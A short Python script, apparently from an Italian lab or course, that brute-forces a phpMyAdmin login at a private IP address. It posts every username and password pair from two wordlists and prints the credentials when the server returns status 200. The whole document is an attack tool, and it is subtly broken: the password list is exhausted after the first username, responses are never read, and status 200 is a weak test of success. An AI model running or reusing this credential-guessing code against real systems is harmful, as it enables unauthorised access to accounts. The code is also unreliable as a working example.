import http.client

def main():
    username_file = 'usernames.txt'
    password_file = 'passwords.txt'

    conn = http.client.HTTPConnection('192.168.50.101')

    with open(username_file, 'r') as usernames, open(password_file, 'r') as passwords:
        for username in usernames:
            username = username.strip()
            for password in passwords:
                password = password.strip()
                
                payload = 'username=' + username + '&password=' + password

                headers = {'Content-Type': 'application/x-www-form-urlencoded'}

                conn.request('POST', '/phpMyAdmin', body=payload, headers=headers)

                response = conn.getresponse()

                if response.status == 200:
                    print('Login riuscito')
                    print('Username:', username)
                    print('Password:', password)
                    return

    print('Login non riuscito')

if __name__ == '__main__':
    main()
